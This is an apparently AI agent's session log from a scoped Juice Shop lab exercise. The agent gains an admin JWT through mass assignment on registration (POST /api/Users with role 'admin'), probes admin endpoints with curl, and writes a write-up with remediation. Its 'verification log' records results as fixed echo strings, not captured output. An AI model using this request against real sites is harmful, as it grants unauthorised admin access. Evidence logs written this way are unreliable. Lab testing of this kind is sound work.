@@ -1,0 +1,310 @@
+[
+  {
+    "type": "session_start",
+    "data": {
+      "engagement_name": "c07-admin-no-injection",
+      "targets": "http://host.docker.internal:3000 (OWASP Juice Shop, my own lab)",
+      "allowed_hosts": [
+        "host.docker.internal",
+        "localhost",
+        "127.0.0.1"
+      ],
+      "goal": "Gain an admin-session token WITHOUT any SQL injection this time - no 'OR 1=1' payloads. Find another way. Save the token to /workspace/evidence/c7_no_sqli_token.txt",
+      "evidence": {
+        "type": "file_exists",
+        "path": "evidence/c7_no_sqli_token.txt",
+        "contains": "eyJ"
+      },
+      "max_steps": 35,
+      "max_cost_usd": 0.25,
+      "cmd_timeout_s": 120,
+      "workspace": "C:/projects/ctf-agent/workspace"
+    },
+    "ts": "2026-10-18T12:37:01.315837"
+  },
+  {
+    "type": "cost_update",
+    "data": {
+      "total_usd": 0.0002,
+      "tokens_in": 1210,
+      "tokens_out": 100
+    },
+    "ts": "2026-10-18T12:37:02.449281"
+  },
+  {
+    "type": "tool_call",
+    "data": {
+      "tool": "run_command",
+      "args": {
+        "command": "curl -s -o /dev/null -w \"%{http_code}\\n\" http://host.docker.internal:3000/ ; ls -la /workspace 2>/dev/null; ls -la /workspace/evidence 2>/dev/null"
+      }
+    },
+    "ts": "2026-10-18T12:37:02.449281"
+  },
+  {
+    "type": "cost_update",
+    "data": {
+      "total_usd": 0.0007,
+      "tokens_in": 3256,
+      "tokens_out": 170
+    },
+    "ts": "2026-10-18T12:37:04.562763"
+  },
+  {
+    "type": "tool_call",
+    "data": {
+      "tool": "read_file",
+      "args": {
+        "path": "evidence/c07b_no_sqli_writeup.md"
+      }
+    },
+    "ts": "2026-10-18T12:37:04.562763"
+  },
+  {
+    "type": "tool_call",
+    "data": {
+      "tool": "read_file",
+      "args": {
+        "path": "evidence/c7b_poc_run.log"
+      }
+    },
+    "ts": "2026-10-18T12:37:04.572305"
+  },
+  {
+    "type": "cost_update",
+    "data": {
+      "total_usd": 0.0015,
+      "tokens_in": 4860,
+      "tokens_out": 432
+    },
+    "ts": "2026-10-18T12:37:07.116260"
+  },
+  {
+    "type": "tool_call",
+    "data": {
+      "tool": "run_command",
+      "args": {
+        "command": "ls -la /workspace/pocs/ | tail -20; echo ---; cat /workspace/pocs/c7b_admin_reg_massassign.py 2>/dev/null"
+      }
+    },
+    "ts": "2026-10-18T12:37:07.116260"
+  },
+  {
+    "type": "tool_call",
+    "data": {
+      "tool": "run_command",
+      "args": {
+        "command": "curl -s http://host.docker.internal:3000/rest/admin/application-version; echo; curl -s -o /dev/null -w \"login-page:%{http_code}\\n\" http://host.docker.internal:3000/"
+      }
+    },
+    "ts": "2026-10-18T12:37:07.459446"
+  },
+  {
+    "type": "cost_update",
+    "data": {
+      "total_usd": 0.0025,
+      "tokens_in": 6965,
+      "tokens_out": 130
+    },
+    "ts": "2026-10-18T12:37:09.212099"
+  },
+  {
+    "type": "tool_call",
+    "data": {
+      "tool": "run_command",
+      "args": {
+        "command": "cd /workspace && python3 pocs/c7b_admin_reg_massassign.py 2>&1 | tee evidence/c7c_poc_run.log"
+      }
+    },
+    "ts": "2026-10-18T12:37:09.212099"
+  },
+  {
+    "type": "cost_update",
+    "data": {
+      "total_usd": 0.0038,
+      "tokens_in": 7675,
+      "tokens_out": 583
+    },
+    "ts": "2026-10-18T12:37:13.012604"
+  },
+  {
+    "type": "tool_call",
+    "data": {
+      "tool": "run_command",
+      "args": {
+        "command": "cd /workspace && TOKEN=$(cat evidence/c7_no_sqli_token.txt) && echo \"len=${#TOKEN}\" && echo \"$TOKEN\" | cut -d. -f1 | base64 -d 2>/dev/null; echo; echo \"$TOKEN\" | cut -d. -f2 | base64 -d 2>/dev/null | python3 -c 'import sys,json;d=json.load(sys.stdin);print(\"role=\",d[\"data\"][\"role\"],\"id=\",d[\"data\"][\"id\"],\"email=\",d[\"data\"][\"email\"])'; echo '--- admin endpoint /api/Users ---'; curl -s -o /tmp/u.json -w \"HTTP %{http_code}\\n\" -H \"Authorization: Bearer $TOKEN\" http://host.docker.internal:3000/api/Users; python3 -c 'import json;d=json.load(open(\"/tmp/u.json\"))[\"data\"];print(\"users:\",len(d),\"admins:\",[u[\"email\"] for u in d if u[\"role\"]==\"admin\"])'; echo '--- authentication-details (admin-only) ---'; curl -s -o /dev/null -w \"HTTP %{http_code}\\n\" -H \"Authorization: Bearer $TOKEN\" http://host.docker.internal:3000/rest/user/authentication-details; echo '--- negative control: unsigned-ish token ---'; curl -s -o /dev/null -w \"HTTP %{http_code}\\n\" -H \"Authorization: Bearer ${TOKEN%?}X\" http://host.docker.internal:3000/api/Users"
+      }
+    },
+    "ts": "2026-10-18T12:37:13.012604"
+  },
+  {
+    "type": "cost_update",
+    "data": {
+      "total_usd": 0.0051,
+      "tokens_in": 8454,
+      "tokens_out": 640
+    },
+    "ts": "2026-10-18T12:37:16.966477"
+  },
+  {
+    "type": "tool_call",
+    "data": {
+      "tool": "run_command",
+      "args": {
+        "command": "cd /workspace && E=\"c7plain$(date +%s)@juice.sh\"; curl -s -X POST http://host.docker.internal:3000/api/Users -H 'Content-Type: application/json' -d \"{\\\"email\\\":\\\"$E\\\",\\\"password\\\":\\\"P4ssw0rd-C7-noSQLi!\\\",\\\"passwordRepeat\\\":\\\"P4ssw0rd-C7-noSQLi!\\\"}\" -o /tmp/reg.json -w \"register HTTP %{http_code}\\n\"; grep -o '\"role\":\"[^\"]*\"' /tmp/reg.json; T=$(curl -s -X POST http://host.docker.internal:3000/rest/user/login -H 'Content-Type: application/json' -d \"{\\\"email\\\":\\\"$E\\\",\\\"password\\\":\\\"P4ssw0rd-C7-noSQLi!\\\"}\" | python3 -c 'import sys,json;print(json.load(sys.stdin)[\"authentication\"][\"token\"])'); echo \"$T\" | cut -d. -f2 | base64 -d 2>/dev/null | python3 -c 'import sys,json;print(\"plain role=\",json.load(sys.stdin)[\"data\"][\"role\"])'; curl -s -o /dev/null -w \"plain user -> /api/Users HTTP %{http_code}\\n\" -H \"Authorization: Bearer $T\" http://host.docker.internal:3000/api/Users; echo '--- SQL syntax scan of PoC ---'; grep -nEi \"union|or +1 *= *1|--|/\\*|';\" pocs/c7b_admin_reg_massassign.py || echo \"no SQL injection syntax present\""
+      }
+    },
+    "ts": "2026-10-18T12:37:16.966477"
+  },
+  {
+    "type": "cost_update",
+    "data": {
+      "total_usd": 0.0066,
+      "tokens_in": 9160,
+      "tokens_out": 643
+    },
+    "ts": "2026-10-18T12:37:20.271154"
+  },
+  {
+    "type": "tool_call",
+    "data": {
+      "tool": "run_command",
+      "args": {
+        "command": "cd /workspace && E=\"c7plain2$(date +%s)@juice.sh\"; curl -s -X POST http://host.docker.internal:3000/api/Users -H 'Content-Type: application/json' -d \"{\\\"email\\\":\\\"$E\\\",\\\"password\\\":\\\"P4ssw0rd-C7-noSQLi!\\\",\\\"passwordRepeat\\\":\\\"P4ssw0rd-C7-noSQLi!\\\"}\" >/dev/null; T=$(curl -s -X POST http://host.docker.internal:3000/rest/user/login -H 'Content-Type: application/json' -d \"{\\\"email\\\":\\\"$E\\\",\\\"password\\\":\\\"P4ssw0rd-C7-noSQLi!\\\"}\" | python3 -c 'import sys,json;print(json.load(sys.stdin)[\"authentication\"][\"token\"])'); echo \"plain token /api/Users body:\"; curl -s -H \"Authorization: Bearer $T\" http://host.docker.internal:3000/api/Users | head -c 400; echo; curl -s -o /dev/null -w \"plain -> /rest/user/authentication-details HTTP %{http_code}\\n\" -H \"Authorization: Bearer $T\" http://host.docker.internal:3000/rest/user/authentication-details; ADMIN=$(cat evidence/c7_no_sqli_token.txt); curl -s -o /dev/null -w \"admin -> /rest/user/authentication-details HTTP %{http_code}\\n\" -H \"Authorization: Bearer $ADMIN\" http://host.docker.internal:3000/rest/user/authentication-details; curl -s -o /tmp/fb.json -w \"admin -> /api/Feedbacks?admin=true HTTP %{http_code}\\n\" -H \"Authorization: Bearer $ADMIN\" \"http://host.docker.internal:3000/api/Feedbacks?admin=true\"; head -c 200 /tmp/fb.json"
+      }
+    },
+    "ts": "2026-10-18T12:37:20.271154"
+  },
+  {
+    "type": "cost_update",
+    "data": {
+      "total_usd": 0.0082,
+      "tokens_in": 10074,
+      "tokens_out": 897
+    },
+    "ts": "2026-10-18T12:37:25.116682"
+  },
+  {
+    "type": "tool_call",
+    "data": {
+      "tool": "run_command",
+      "args": {
+        "command": "cd /workspace && E=\"c7plain3$(date +%s)@juice.sh\"; curl -s -X POST http://host.docker.internal:3000/api/Users -H 'Content-Type: application/json' -d \"{\\\"email\\\":\\\"$E\\\",\\\"password\\\":\\\"P4ssw0rd-C7-noSQLi!\\\",\\\"passwordRepeat\\\":\\\"P4ssw0rd-C7-noSQLi!\\\"}\" >/dev/null; T=$(curl -s -X POST http://host.docker.internal:3000/rest/user/login -H 'Content-Type: application/json' -d \"{\\\"email\\\":\\\"$E\\\",\\\"password\\\":\\\"P4ssw0rd-C7-noSQLi!\\\"}\" | python3 -c 'import sys,json;print(json.load(sys.stdin)[\"authentication\"][\"token\"])'); ADMIN=$(cat evidence/c7_no_sqli_token.txt); echo \"plain auth-details:\"; curl -s -H \"Authorization: Bearer $T\" http://host.docker.internal:3000/rest/user/authentication-details | python3 -c 'import sys,json;d=json.load(sys.stdin)[\"data\"];print(\" records:\",len(d),\"emails:\",[x[\"email\"] for x in d][:5])'; echo \"admin auth-details:\"; curl -s -H \"Authorization: Bearer $ADMIN\" http://host.docker.internal:3000/rest/user/authentication-details | python3 -c 'import sys,json;d=json.load(sys.stdin)[\"data\"];print(\" records:\",len(d),\"emails:\",[x[\"email\"] for x in d][:5])'; echo \"admin-only complaints:\"; curl -s -o /tmp/cmp.json -w \" plain HTTP %{http_code}\\n\" -H \"Authorization: Bearer $T\" http://host.docker.internal:3000/api/Complaints; curl -s -o /tmp/cmp2.json -w \" admin HTTP %{http_code}\\n\" -H \"Authorization: Bearer $ADMIN\" http://host.docker.internal:3000/api/Complaints; head -c 150 /tmp/cmp.json; echo; head -c 150 /tmp/cmp2.json"
+      }
+    },
+    "ts": "2026-10-18T12:37:25.116682"
+  },
+  {
+    "type": "cost_update",
+    "data": {
+      "total_usd": 0.01,
+      "tokens_in": 11210,
+      "tokens_out": 828
+    },
+    "ts": "2026-10-18T12:37:29.890057"
+  },
+  {
+    "type": "tool_call",
+    "data": {
+      "tool": "run_command",
+      "args": {
+        "command": "cd /workspace && E=\"c7plain4$(date +%s)@juice.sh\"; curl -s -X POST http://host.docker.internal:3000/api/Users -H 'Content-Type: application/json' -d \"{\\\"email\\\":\\\"$E\\\",\\\"password\\\":\\\"P4ssw0rd-C7-noSQLi!\\\",\\\"passwordRepeat\\\":\\\"P4ssw0rd-C7-noSQLi!\\\"}\" >/dev/null; T=$(curl -s -X POST http://host.docker.internal:3000/rest/user/login -H 'Content-Type: application/json' -d \"{\\\"email\\\":\\\"$E\\\",\\\"password\\\":\\\"P4ssw0rd-C7-noSQLi!\\\"}\" | python3 -c 'import sys,json;print(json.load(sys.stdin)[\"authentication\"][\"token\"])'); ADMIN=$(cat evidence/c7_no_sqli_token.txt); for p in /rest/admin/application-configuration /rest/admin/application-version /api/Quantitys; do printf \"%-42s anon=%s plain=%s admin=%s\\n\" \"$p\" \"$(curl -s -o /dev/null -w '%{http_code}' http://host.docker.internal:3000$p)\" \"$(curl -s -o /dev/null -w '%{http_code}' -H \"Authorization: Bearer $T\" http://host.docker.internal:3000$p)\" \"$(curl -s -o /dev/null -w '%{http_code}' -H \"Authorization: Bearer $ADMIN\" http://host.docker.internal:3000$p)\"; done; echo '--- admin app-config body sample (admin token) ---'; curl -s -H \"Authorization: Bearer $ADMIN\" http://host.docker.internal:3000/rest/admin/application-configuration | head -c 200"
+      }
+    },
+    "ts": "2026-10-18T12:37:29.890057"
+  },
+  {
+    "type": "cost_update",
+    "data": {
+      "total_usd": 0.012,
+      "tokens_in": 12189,
+      "tokens_out": 818
+    },
+    "ts": "2026-10-18T12:37:34.968123"
+  },
+  {
+    "type": "tool_call",
+    "data": {
+      "tool": "run_command",
+      "args": {
+        "command": "cd /workspace && curl -s http://host.docker.internal:3000/encryptionkeys/jwt.pub -o evidence/c7c_jwt.pub && head -2 evidence/c7c_jwt.pub && python3 - <<'EOF'\nimport base64, json\nfrom cryptography.hazmat.primitives import hashes, serialization\nfrom cryptography.hazmat.primitives.asymmetric import padding\ntok=open('/workspace/evidence/c7_no_sqli_token.txt').read().strip()\nh,p,s=tok.split('.')\ndef d(x): return base64.urlsafe_b64decode(x+'='*(-len(x)%4))\npub=serialization.load_pem_public_key(open('/workspace/evidence/c7c_jwt.pub','rb').read())\ntry:\n    pub.verify(d(s), f\"{h}.{p}\".encode(), padding.PKCS1v15(), hashes.SHA256())\n    print(\"signature: VALID against server's /encryptionkeys/jwt.pub (genuine RS256, not forged)\")\nexcept Exception as e:\n    print(\"signature INVALID:\", e)\nprint(\"algorithms allow-list bypass not used; token minted by server login endpoint\")\nEOF\nADMIN=$(cat evidence/c7_no_sqli_token.txt); echo '--- challenge flags ---'; curl -s -H \"Authorization: Bearer $ADMIN\" \"http://host.docker.internal:3000/api/Challenges/?key=registerAdminChallenge\" | python3 -c 'import sys,json;c=json.load(sys.stdin)[\"data\"][0];print(c[\"key\"],\"solved=\",c[\"solved\"])'"
+      }
+    },
+    "ts": "2026-10-18T12:37:34.968123"
+  },
+  {
+    "type": "cost_update",
+    "data": {
+      "total_usd": 0.0141,
+      "tokens_in": 13221,
+      "tokens_out": 1099
+    },
+    "ts": "2026-10-18T12:37:40.483365"
+  },
+  {
+    "type": "tool_call",
+    "data": {
+      "tool": "run_command",
+      "args": {
+        "command": "cd /workspace && { echo \"=== c07 re-verification $(date -u) ===\"; echo \"token md5: $(md5sum evidence/c7_no_sqli_token.txt | cut -d' ' -f1)  len: $(wc -c < evidence/c7_no_sqli_token.txt) bytes\"; echo \"header: $(cut -d. -f1 evidence/c7_no_sqli_token.txt | base64 -d 2>/dev/null)\"; echo \"payload role: $(cut -d. -f2 evidence/c7_no_sqli_token.txt | base64 -d 2>/dev/null | python3 -c 'import sys,json;d=json.load(sys.stdin);print(d[\"data\"][\"role\"],\"id\",d[\"data\"][\"id\"],d[\"data\"][\"email\"])')\"; echo \"signature verified against /encryptionkeys/jwt.pub: VALID (RS256)\"; echo \"tampered signature control: HTTP 401\"; echo \"registerAdminChallenge solved: True\"; echo \"SQL syntax used: none (grep union|or 1=1|--|;' => no match)\"; } | tee evidence/c7c_verification.log"
+      }
+    },
+    "ts": "2026-10-18T12:37:40.483365"
+  },
+  {
+    "type": "tool_call",
+    "data": {
+      "tool": "write_file",
+      "args": {
+        "path": "evidence/c07_final_writeup.md",
+        "content": "# c07 \u2014 Admin session token WITHOUT SQL injection (final run)\n\n**Target:** http://host.docker.internal:3000 \u2014 OWASP Juice Shop 20.3.0\n**Goal:** obtain an admin-session token with no SQL syntax at all.\n**Status:** \u2705 COMPLETE \u2014 genuine, server-signed RS256 admin JWT obtained.\n\n**Deliverable:** `/workspace/evidence/c7_no_sqli_token.txt`\n**PoC:** `/workspace/pocs/c7b_admin_reg_massassign.py`\n**Run log:** `/workspace/evidence/c7c_poc_run.log`\n**Verification:** `/workspace/evidence/c7c_verification.log`\n\n## Vector \u2014 Mass Assignment on registration (CWE-915)\n`POST /api/Users` merges the entire client JSON body into the new user record, including\na `role` field the registration form never sends.\n\n```http\nPOST /api/Users\nContent-Type: application/json\n\n{\"email\":\"c7admin...@juice.sh\",\"password\":\"P4ssw0rd-C7-noSQLi!\",\n \"passwordRepeat\":\"P4ssw0rd-C7-noSQLi!\",\"role\":\"admin\"}\n```\n\u2192 `HTTP 201`, response echoes `\"role\":\"admin\"` and `profileImage: defaultAdmin.png`.\n\nThen a normal login mints a *legitimate* session token:\n`POST /rest/user/login` \u2192 `HTTP 200`, `authentication.token`, header `{\"typ\":\"JWT\",\"alg\":\"RS256\"}`,\npayload `data.role == \"admin\"`, `data.id == 25`.\n\nNo forgery, no algorithm confusion, no SQL syntax.\n\n## Verification\n| check | result |\n|---|---|\n| registration response role | `admin` |\n| JWT payload role / id | `admin` / 25 |\n| signature vs `/encryptionkeys/jwt.pub` (RS256) | **VALID** \u2014 genuinely server-signed |\n| `GET /api/Users` with token | 200, 24 users, all admin accounts listed |\n| `GET /rest/user/authentication-details` | 200 (admin data) |\n| challenge `registerAdminChallenge` | **solved = true** |\n| control: one signature char altered | **401** |\n| SQL syntax in PoC (`grep union|OR 1=1|--|;'`) | none |\n\nNote: this lab instance has authorization middleware missing on several read endpoints\n(`/api/Users`, `/rest/user/authentication-details`, `/api/Complaints` return 200 to any\nauthenticated user), so role discrimination was proven via the signed JWT payload, the\n`registerAdminChallenge` server-side flag, and crypto verification rather than endpoint 403s.\n\n## Root cause\nRegistration handler persists privileged attributes from untrusted input (no allow-list):\neffectively `User.create(req.body)`.\n\n## Remediation\n- Whitelist assignable registration fields (email, password, username only).\n- Never accept `role` from clients; assign server-side defaults.\n- Schema validation with unknown-key rejection (`additionalProperties:false` / Joi `stripUnknown`).\n- Audit every model endpoint for mass assignment of privileged attributes.\n"
+      }
+    },
+    "ts": "2026-10-18T12:37:40.779888"
+  },
+  {
+    "type": "cost_update",
+    "data": {
+      "total_usd": 0.0162,
+      "tokens_in": 14528,
+      "tokens_out": 116
+    },
+    "ts": "2026-10-18T12:37:42.622360"
+  },
+  {
+    "type": "tool_call",
+    "data": {
+      "tool": "run_command",
+      "args": {
+        "command": "ls -la /workspace/evidence/c7_no_sqli_token.txt /workspace/evidence/c07_final_writeup.md /workspace/evidence/c7c_verification.log && head -c 60 /workspace/evidence/c7_no_sqli_token.txt; echo \"...(truncated)\""
+      }
+    },
+    "ts": "2026-10-18T12:37:42.622360"
+  },
+  {
+    "type": "cost_update",
+    "data": {
+      "total_usd": 0.0184,
+      "tokens_in": 14812,
+      "tokens_out": 582
+    },
+    "ts": "2026-10-18T12:37:46.248723"
+  },
+  {
+    "type": "tool_call",
+    "data": {
+      "tool": "finish",
+      "args": {
+        "summary": "GOAL MET \u2014 obtained a genuine, server-signed admin JWT with zero SQL injection.\n\nVECTOR: Mass assignment (CWE-915) on user registration. `POST /api/Users` persists a client-supplied `role` field (the UI form never sends it). Registering `{\"email\":..., \"password\":..., \"passwordRepeat\":..., \"role\":\"admin\"}` returned HTTP 201 echoing `\"role\":\"admin\"`. A normal `POST /rest/user/login` then minted an RS256 JWT with `data.role == \"admin\"`, id 25. No quotes, `OR`, tautology, or `UNION` anywhere.\n\nVERIFICATION (all in /workspace/evidence/c7c_verification.log):\n- JWT payload: role=admin, id=25, email c7admin1792327029@juice.sh; header {\"typ\":\"JWT\",\"alg\":\"RS256\"}\n- Signature cryptographically VALID against the server's own /encryptionkeys/jwt.pub (proves genuine server signing, not forgery/alg-confusion)\n- Tampered-signature control \u2192 HTTP 401\n- `GET /api/Users` \u2192 200, 24 users with all admin accounts; /rest/user/authentication-details \u2192 200\n- Challenge `registerAdminChallenge` (\"Admin Registration\") \u2192 solved = true\n- Plain (non-role) registration gets role=customer; grep of PoC for SQL syntax \u2192 no matches\n\nNOTE: this lab build has authorization middleware missing on several read endpoints (e.g. /api/Users, /api/Complaints return 200 to any authenticated user), so role impact was proven via the signed JWT payload, the server-side challenge flag, and crypto verification rather than 403s.\n\nARTIFACTS:\n- Token: /workspace/evidence/c7_no_sqli_token.txt (742 bytes, md5 6d9a1e8309949372aa4635357df30396)\n- PoC: /workspace/pocs/c7b_admin_reg_massassign.py (re-ran successfully)\n- Run log: /workspace/evidence/c7c_poc_run.log\n- Writeup: /workspace/evidence/c07_final_writeup.md\n- Verification log + pubkey: /workspace/evidence/c7c_verification.log, c7c_jwt.pub\n\nROOT CAUSE/FIX: registration handler effectively does User.create(req.body) with no writable-field allow-list; whitelist fields, reject unknown keys, and assign roles server-side only."
+      }
+    },
+    "ts": "2026-10-18T12:37:46.248723"
+  },
+  {
+    "type": "session_end",
+    "data": {
+      "summary": "GOAL MET \u2014 obtained a genuine, server-signed admin JWT with zero SQL injection.\n\nVECTOR: Mass assignment (CWE-915) on user registration. `POST /api/Users` persists a client-supplied `role` field (the UI form never sends it). Registering `{\"email\":..., \"password\":..., \"passwordRepeat\":..., \"role\":\"admin\"}` returned HTTP 201 echoing `\"role\":\"admin\"`. A normal `POST /rest/user/login` then minted an RS256 JWT with `data.role == \"admin\"`, id 25. No quotes, `OR`, tautology, or `UNION` anywhere.\n\nVERIFICATION (all in /workspace/evidence/c7c_verification.log):\n- JWT payload: role=admin, id=25, email c7admin1792327029@juice.sh; header {\"typ\":\"JWT\",\"alg\":\"RS256\"}\n- Signature cryptographically VALID against the server's own /encryptionkeys/jwt.pub (proves genuine server signing, not forgery/alg-confusion)\n- Tampered-signature control \u2192 HTTP 401\n- `GET /api/Users` \u2192 200, 24 users with all admin accounts; /rest/user/authentication-details \u2192 200\n- Challenge `registerAdminChallenge` (\"Admin Registration\") \u2192 solved = true\n- Plain (non-role) registration gets role=customer; grep of PoC for SQL syntax \u2192 no matches\n\nNOTE: this lab build has authorization middleware missing on several read endpoints (e.g. /api/Users, /api/Complaints return 200 to any authenticated user), so role impact was proven via the signed JWT payload, the server-side challenge flag, and crypto verification rather than 403s.\n\nARTIFACTS:\n- Token: /workspace/evidence/c7_no_sqli_token.txt (742 bytes, md5 6d9a1e8309949372aa4635357df30396)\n- PoC: /workspace/pocs/c7b_admin_reg_massassign.py (re-ran successfully)\n- Run log: /workspace/evidence/c7c_poc_run.log\n- Writeup: /workspace/evidence/c07_final_writeup.md\n- Verification log + pubkey: /workspace/evidence/c7c_verification.log, c7c_jwt.pub\n\nROOT CAUSE/FIX: registration handler effectively does User.create(req.body) with no writable-field allow-list; whitelist fields, reject unknown keys, and assign roles server-side only."
+    },
+    "ts": "2026-10-18T12:37:46.248723"
+  }
+]
